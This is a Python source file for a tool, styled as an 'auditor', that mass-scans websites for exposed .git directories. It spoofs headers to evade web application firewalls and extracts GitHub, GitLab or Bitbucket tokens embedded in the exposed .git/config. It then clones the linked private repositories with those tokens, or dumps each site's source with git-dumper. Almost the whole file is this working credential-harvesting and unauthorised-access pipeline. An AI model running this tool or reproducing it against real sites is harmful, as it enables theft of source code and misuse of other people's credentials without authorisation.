import os
import shutil
import json
import requests
import configparser
import git
import subprocess
import re
from urllib.parse import urlparse, urlunparse
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
import random

# Suppress InsecureRequestWarning
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

console = Console()

def get_random_user_agent():
    """Returns a random User-Agent string."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/109.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.1518.52",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(user_agents)

def generate_advanced_waf_bypass_headers():
    """Generates headers for WAF evasion."""
    return {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "max-age=0",
        "X-Forwarded-For": f"192.168.1.{random.randint(1, 254)}",
        "Referer": "https://www.google.com/",
    }

def generate_bypass_paths(base_path=".git/config"):
    """Generates obfuscated paths for WAF bypass."""
    return [
        f"/{base_path}",
        # f"/{base_path.upper()}",
        # "/.Git/config",
        # "/.git%2Fconfig",
        # "/.git%252Fconfig",
        # f"/./{base_path}",
        # f"/{base_path}/.",
    ]

def check_git_config_advanced(url: str) -> tuple[bool, str]:
    """Check for exposed .git/config using WAF bypass techniques."""
    paths = generate_bypass_paths()
    http_verbs = ["GET"]

    for verb in http_verbs:
        for path in paths:
            parsed_path = urlparse(path)
            full_url = f"{url.rstrip('/')}{parsed_path.path}"
            if parsed_path.query:
                full_url += f"?{parsed_path.query}"
                
            headers = generate_advanced_waf_bypass_headers()
            console.print(f"[cyan]METHOD:[/cyan] {verb} [cyan]URL:[/cyan] {full_url}")

            try:
                response = requests.request(
                    verb,
                    full_url,
                    headers=headers,
                    allow_redirects=False,
                    verify=False
                )

                if response.status_code == 200 and "[core]" in response.text.lower():
                    console.print(f"[bold green]>>> SUCCESS: Exposed .git/config found! <<<[/bold green]")
                    return True, response.text

                elif response.status_code in (403, 401, 405, 500):
                    console.print(f"[yellow]INFO: Status {response.status_code} for {full_url}. (WAF may be present)[/yellow]")
                
                elif verb == "GET":
                    for subfile_path in generate_bypass_paths(".git/HEAD"):
                        sub_url = f"{url.rstrip('/')}{subfile_path}"
                        sub_response = requests.get(sub_url, headers=headers, timeout=5, verify=False)
                        if sub_response.status_code == 200 and ("ref:" in sub_response.text or "commit" in sub_response.text):
                            console.print(f"[bold green]>>> SUCCESS: Exposed .git directory confirmed via {sub_url} <<<[/bold green]")
                            return True, ""

            except requests.exceptions.RequestException as e:
                console.print(f"[bold red]ERROR: Request failed for {full_url}: {e}[/bold red]")
                continue

    return False, ""

def parse_gitconfig(content: str) -> list:
    """Parse .git/config content for URLs with credentials."""
    config = configparser.ConfigParser()
    urls = []
    try:
        config.read_string(content)
        for section in config.sections():
            if 'url' in config[section]:
                url = config[section]['url']
                if url and '://' in url and '@' in url:
                    urls.append(url)
    except Exception as e:
        console.print(f"[yellow]Error parsing .git/config: {e}[/yellow]")
    return urls

def extract_token_info(url):
    """Extract credential information from a URL."""
    token_info = {'has_token': False, 'token_type': None, 'username': None, 'host': None, 'scope': 'unknown', 'has_password': False}
    try:
        parsed = urlparse(url)
        if parsed.username:
            token_info.update({'has_token': True, 'username': parsed.username, 'host': parsed.hostname})
            username_lower = parsed.username.lower()
            token = parsed.password or ""
            hostname_lower = (parsed.hostname or "").lower()

            if 'gitlab' in hostname_lower:
                token_info['token_type'] = 'GitLab'
                token_info['scope'] = 'GitLab Personal/CI Token' if username_lower == 'gitlab-ci-token' or token.startswith('glpat-') else 'GitLab Token'
            elif 'github' in hostname_lower:
                token_info['token_type'] = 'GitHub'
                token_info['scope'] = 'GitHub Personal/OAuth Token' if token.startswith(('ghp_', 'ghs_', 'gho_')) or len(token) == 40 else 'GitHub Token'
            elif 'bitbucket' in hostname_lower:
                token_info['token_type'] = 'Bitbucket'
                token_info['scope'] = 'Bitbucket App Password / Token'
            else:
                token_info['token_type'] = 'Generic Git'
                token_info['scope'] = 'Custom Git Server Token / Password'
            token_info['has_password'] = bool(parsed.password)
    except Exception:
        pass
    return token_info

def get_folder_size(folder_path):
    total_size = 0
    for dirpath, _, filenames in os.walk(folder_path):
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            try:
                total_size += os.path.getsize(filepath)
            except (OSError, FileNotFoundError):
                pass
    return total_size

def format_size(size_bytes):
    if size_bytes == 0:
        return "0 B"
    size_names = ["B", "KB", "MB", "GB", "TB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024.0
        i += 1
    return f"{size_bytes:.2f} {size_names[i]}"

def extract_repo_name(url):
    parsed = urlparse(url)
    path = parsed.path
    if path.endswith('.git'):
        path = path[:-4]
    repo_name = path.split('/')[-1]
    return repo_name.replace(' ', '_').replace('-', '_') if repo_name else "cloned_repo"

def get_repo_info(repo_path):
    try:
        repo = git.Repo(repo_path)
        last_commit = repo.head.commit
        return {
            'active_branch': repo.active_branch.name if not repo.head.is_detached else 'DETACHED',
            'total_commits': len(list(repo.iter_commits())),
            'remote_url': repo.remotes.origin.url if repo.remotes else 'None',
            'last_commit': {
                'hash': last_commit.hexsha,
                'message': last_commit.message.strip(),
                'author': str(last_commit.author),
                'date': datetime.fromtimestamp(last_commit.committed_date).isoformat()
            },
            'branches': [branch.name for branch in repo.branches],
            'tags': [tag.name for tag in repo.tags],
            'is_dirty': repo.is_dirty(),
            'untracked_files': repo.untracked_files
        }
    except Exception as e:
        return {'error': str(e)}

def save_clone_info(clone_directory, repo_url, token_info, repo_info):
    safe_token_info = token_info.copy()
    if 'token' in safe_token_info:
        safe_token_info.pop('token', None)
    
    info_data = {
        'clone_date': datetime.now().isoformat(),
        'clone_url': repo_url,
        'token_info': safe_token_info,
        'repository_info': repo_info
    }
    
    with open(os.path.join(clone_directory, '.clone_info.json'), 'w') as f:
        json.dump(info_data, f, indent=2)

    with open(os.path.join(clone_directory, 'CLONE_INFO.md'), 'w') as f:
        f.write("# Repository Clone Information\n\n")
        f.write(f"**Cloned on:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n")
        f.write(f"**Clone URL:** `{repo_url}`\n\n")
        if token_info['has_token']:
            f.write("## 🔐 Credential Information\n")
            f.write(f"- **Host:** {token_info['host']}\n")
            f.write(f"- **Type:** {token_info['token_type']}\n")
            f.write(f"- **Scope:** {token_info['scope']}\n")
            f.write(f"- **Has Password:** {token_info['has_password']}\n\n")
            f.write("> **WARNING:** A credential was embedded in the clone URL. The token has been redacted.\n\n")
        if 'error' not in repo_info:
            f.write("## 📊 Repository Details\n")
            f.write(f"- **Active Branch:** {repo_info['active_branch']}\n")
            f.write(f"- **Total Commits:** {repo_info['total_commits']}\n")
            f.write(f"- **Branches Count:** {len(repo_info['branches'])}\n")
            f.write(f"- **Tags Count:** {len(repo_info['tags'])}\n")

def normalize_url(website_url: str) -> str:
    """Normalize URL, preserving explicit ports and preferring https if applicable."""
    try:
        # Add scheme if missing
        if not website_url.startswith(('http://', 'https://')):
            website_url = f"https://{website_url}"
        
        parsed = urlparse(website_url)
        scheme = parsed.scheme or 'https'
        netloc = parsed.netloc
        hostname = netloc
        port = None

        # Handle explicit ports
        if ':' in netloc and netloc[-1] != ']':  # Exclude IPv6 addresses
            hostname, port_str = netloc.rsplit(':', 1)
            try:
                port = int(port_str)
                if not (1 <= port <= 65535):
                    console.print(f"[yellow]Invalid port {port_str} in {website_url}. Ignoring port.[/yellow]")
                    port = None
            except ValueError:
                console.print(f"[yellow]Invalid port format {port_str} in {website_url}. Ignoring port.[/yellow]")
                port = None

        # Reconstruct netloc
        netloc = hostname if not port else f"{hostname}:{port}"

        # Check if http redirects to https
        if scheme == 'http':
            http_url = urlunparse(('http', netloc, parsed.path, parsed.params, parsed.query, parsed.fragment))
            try:
                response = requests.head(http_url, timeout=5, allow_redirects=False, verify=False)
                if response.status_code in (301, 302) and 'location' in response.headers:
                    if response.headers['location'].startswith('https://'):
                        scheme = 'https'
            except:
                pass

        # Preserve path, query, and params; remove fragment
        return urlunparse((scheme, netloc, parsed.path, parsed.params, parsed.query, '')).rstrip('/')
    except Exception as e:
        console.print(f"[yellow]Error normalizing URL {website_url}: {e}[/yellow]")
        return website_url.rstrip('/')

def check_git_dumper_vulnerability(website_url: str, timeout: int = 5) -> bool:
    """Check if the website is vulnerable to git-dumper by testing .git/HEAD."""
    try:
        clean_url = normalize_url(website_url)
        head_url = f"{clean_url.rstrip('/')}/.git/HEAD"  # Fixed typo from .git_config
        response = requests.head(head_url, timeout=timeout, allow_redirects=True, verify=False)
        console.print(f"[cyan]Testing {head_url} [{response.status_code}][/cyan]")
        if response.status_code == 200:
            console.print(f"[bold yellow]⚠️ {clean_url} can be attacked using git-dumper![/bold yellow]")
            return True
        else:
            console.print(f"[cyan]{clean_url} responded with status code {response.status_code}. Not vulnerable to git-dumper.[/cyan]")
            return False
    except Exception as e:
        console.print(f"[yellow]Error checking {head_url}: {e}. Not vulnerable to git-dumper.[/yellow]")
        return False

def git_dumper_clone(website_url: str, clone_directory: str, force: bool) -> bool:
    """Attempt to clone a repository using git-dumper."""
    try:
        clean_url = normalize_url(website_url)
        
        head_url = f"{clean_url.rstrip('/')}/.git/HEAD"
        response = requests.head(head_url, timeout=5, allow_redirects=True, verify=False)
        console.print(f"[cyan]Testing {head_url} [{response.status_code}][/cyan]")
        if response.status_code != 200:
            console.print(f"[yellow]{head_url} responded with status code {response.status_code}. Skipping git-dumper.[/yellow]")
            return False

        if os.path.exists(clone_directory):
            if force:
                console.print(f"🗑️ `--force` enabled. Removing existing directory {clone_directory}...", style="bold yellow")
                shutil.rmtree(clone_directory)
            else:
                console.print(f"[bold red]Error:[/bold red] Directory '{clone_directory}' exists. Use `--force` to overwrite.")
                return False

        os.makedirs(clone_directory, exist_ok=True)

        console.print(f"[cyan]Running git-dumper on {clean_url}...[/cyan]")
        process = subprocess.Popen(
            ["git-dumper", clean_url, clone_directory],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                console.print(output.strip(), style="cyan")
        
        return_code = process.poll()
        if return_code == 0:
            console.print(f"[bold green]✅ Cloned {clean_url} using git-dumper to {clone_directory}![/bold green]")
            return True
        else:
            console.print(Panel(
                f"git-dumper failed with exit code {return_code}.",
                title="[bold red]GIT-DUMPER ERROR[/bold red]",
                border_style="red"
            ))
            return False
    except subprocess.TimeoutExpired:
        console.print(Panel(
            "git-dumper timed out after 5 minutes.",
            title="[bold red]GIT-DUMPER ERROR[/bold red]",
            border_style="red"
        ))
        return False
    except FileNotFoundError:
        console.print(Panel(
            "git-dumper tool not found. Please install it with 'pip install git-dumper'.",
            title="[bold red]GIT-DUMPER ERROR[/bold red]",
            border_style="red"
        ))
        return False
    except Exception as e:
        console.print(Panel(
            f"git-dumper clone failed.\nError: {e}",
            title="[bold red]GIT-DUMPER ERROR[/bold red]",
            border_style="red"
        ))
        return False

def save_scan_results(output_dir, results):
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    result_file = os.path.join(output_dir, f'scan_result_{timestamp}.json')
    with open(result_file, 'w') as f:
        json.dump(results, f, indent=2)
    console.print(f"[green]💾 Scan results saved to {result_file}[/green]")

def scan_and_clone(url: str, output_dir: str, force: bool, clone_only: bool = False):
    """Scan a URL for exposed .git/config and clone repositories with credentials."""
    results = {'url': url, 'git_config_accessible': False, 'urls_with_credentials': [], 'cloned_repos': []}
    
    accessible, config_content = check_git_config_advanced(url)
    results['git_config_accessible'] = accessible
    if clone_only or not accessible:
        if not accessible:
            console.print(f"[yellow]No accessible .git/config at {url}[/yellow]")
        if check_git_dumper_vulnerability(url):
            base_dir = output_dir or "cloned_repos"
            clone_directory = os.path.join(base_dir, extract_repo_name(url))
            token_info = extract_token_info(url)
            if git_dumper_clone(url, clone_directory, force):
                repo_info = get_repo_info(clone_directory)
                results['cloned_repos'].append({
                    'repo_url': url,
                    'clone_directory': clone_directory,
                    'token_info': token_info,
                    'repo_info': repo_info
                })
                save_clone_info(clone_directory, url, token_info, repo_info)
        return results
    
    console.print(Panel(f"🔍 Found accessible .git/config at {url}", style="bold blue"))
    
    repo_urls = parse_gitconfig(config_content)
    if not repo_urls:
        console.print(f"[yellow]No URLs with credentials found in {url}/.git/config[/yellow]")
        check_git_dumper_vulnerability(url)
        return results
    
    results['urls_with_credentials'] = repo_urls
    console.print(f"[cyan]Found {len(repo_urls)} URL(s) with credentials.[/cyan]")
    
    for repo_url in repo_urls:
        token_info = extract_token_info(repo_url)
        if not token_info['has_token']:
            console.print(f"[yellow]Skipping {repo_url}: No credentials detected.[/yellow]")
            continue

        console.print(
            Panel(
                Text(f"URL: {repo_url}\nHost: {token_info['host']}\nType: {token_info['token_type']}\nScope: {token_info['scope']}\nHas Password: {token_info['has_password']}", style="cyan"),
                title="[bold red]⚠️ Credential Detected in URL[/bold red]",
                border_style="red"
            )
        )

        high_impact = 'Personal' in token_info['scope']
        if high_impact:
            response = input("This URL contains high-impact credentials. Proceed with cloning? [y/N]: ").strip().lower()
            if response != 'y':
                console.print(f"[bold yellow]🛑 Cloning {repo_url} aborted by user.[/bold yellow]")
                continue

        base_dir = output_dir or "cloned_repos"
        clone_directory = os.path.join(base_dir, extract_repo_name(repo_url))
        console.print(f"📂 Cloning into: [cyan]{os.path.abspath(clone_directory)}[/cyan]")
        
        if os.path.exists(clone_directory):
            if force:
                console.print(f"🗑️ `--force` enabled. Removing existing directory...", style="bold yellow")
                shutil.rmtree(clone_directory)
            else:
                console.print(f"[bold red]Error:[/bold red] Directory '{clone_directory}' exists. Use `--force` to overwrite.")
                continue

        if token_info['has_password']:
            try:
                console.print(f"\n⏬ Cloning {repo_url}...")
                git.Repo.clone_from(repo_url, clone_directory, progress=lambda op_code, cur_count, max_count, msg: console.log(msg or "..."))
                console.print(f"[bold green]✅ Cloned {repo_url} successfully![/bold green]")
                
                repo_info = get_repo_info(clone_directory)
                table = Table(title=f"📊 Analysis for {repo_url}", show_header=True)
                table.add_column("Metric", style="bold cyan")
                table.add_column("Value", style="magenta")
                
                table.add_row("Repository Size", format_size(get_folder_size(clone_directory)))
                if 'error' not in repo_info:
                    table.add_row("Active Branch", repo_info['active_branch'])
                    table.add_row("Total Commits", str(repo_info['total_commits']))
                    table.add_row("Total Branches", str(len(repo_info['branches'])))
                    table.add_row("Total Tags", str(len(repo_info['tags'])))
                    table.add_row("Last Commit Author", repo_info['last_commit']['author'])
                    table.add_row("Last Commit Date", datetime.fromisoformat(repo_info['last_commit']['date']).strftime('%Y-%m-%d'))
                console.print(table)

                save_clone_info(clone_directory, repo_url, token_info, repo_info)
                results['cloned_repos'].append({
                    'repo_url': repo_url,
                    'clone_directory': clone_directory,
                    'token_info': token_info,
                    'repo_info': repo_info
                })
            except git.exc.GitCommandError as e:
                console.print(Panel(f"Direct clone failed.\nError: {e.stderr.strip()}", title="[bold red]GIT ERROR[/bold red]", border_style="red"))
                check_git_dumper_vulnerability(url)
    
    return results

def parse_input_file(file_path: str) -> list:
    """Parse input file (.txt, .csv, .json) and return unique normalized URLs with port support."""
    urls = set()
    ext = os.path.splitext(file_path)[1].lower()
    
    domain_pattern = re.compile(
        r'^(?:https?:\/\/)?'  # Optional scheme
        r'(?:[\w-]+\.)*[\w-]+\.[a-zA-Z]{2,}'  # Domain
        r'(?::\d{1,5})?'  # Optional port
        r'(?:\/[^\s]*)?$'  # Optional path
    )

    try:
        if ext == '.txt':
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and domain_pattern.match(line):
                        urls.add(line)
                    elif line:
                        console.print(f"[yellow]Skipping invalid domain: {line}[/yellow]")
                        
        elif ext == '.csv':
            import pandas as pd
            df = pd.read_csv(file_path)
            for column in df.columns:
                urls.update(str(item).strip() for item in df[column] 
                           if str(item).strip() != 'nan' and domain_pattern.match(str(item).strip()))
                          
        elif ext == '.json':
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, list):
                    urls.update(str(item).strip() for item in data 
                               if str(item).strip() and domain_pattern.match(str(item).strip()))
                elif isinstance(data, dict):
                    for value in data.values():
                        if isinstance(value, list):
                            urls.update(str(item).strip() for item in value 
                                       if str(item).strip() and domain_pattern.match(str(item).strip()))
                        else:
                            item = str(value).strip()
                            if item and domain_pattern.match(item):
                                urls.add(item)
        else:
            console.print(f"[yellow]Unsupported file format: {ext}. Treating as .txt.[/yellow]")
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and domain_pattern.match(line):
                        urls.add(line)
                    elif line:
                        console.print(f"[yellow]Skipping invalid domain: {line}[/yellow]")
                        
    except FileNotFoundError:
        console.print(f"[bold red]Error: File {file_path} not found.[/bold red]")
        return []
    except UnicodeDecodeError:
        console.print(f"[bold red]Error: File {file_path} has invalid encoding.[/bold red]")
        return []
    except Exception as e:
        console.print(f"[bold red]Error reading file {file_path}: {e}[/bold red]")
        return []

    return [normalize_url(url) for url in urls if url]

def run_scan_process(input_source: str, output_dir: str, force: bool, clone_only: bool = False):
    """Process a single URL or file with URLs for scanning and cloning."""
    console.print(Panel(f"🔗 Git Config Cloner - Exposed .git/config Auditor", style="bold blue"))
    
    results = []
    urls = []
    
    if os.path.isfile(input_source):
        urls = parse_input_file(input_source)
    else:
        urls = [normalize_url(input_source)]
    
    if not urls:
        console.print("[bold yellow]No valid URLs provided.[/bold yellow]")
        return results
    
    console.print(f"[cyan]Processing {len(urls)} unique URLs.[/cyan]")
    for url in urls:
        console.print(f"[cyan]Scanning URL: {url}[/cyan]")
        result = scan_and_clone(url, output_dir, force, clone_only)
        results.append(result)
    
    if not clone_only:
        output_dir = output_dir or "scan_results"
        save_scan_results(output_dir, results)
    
    return results

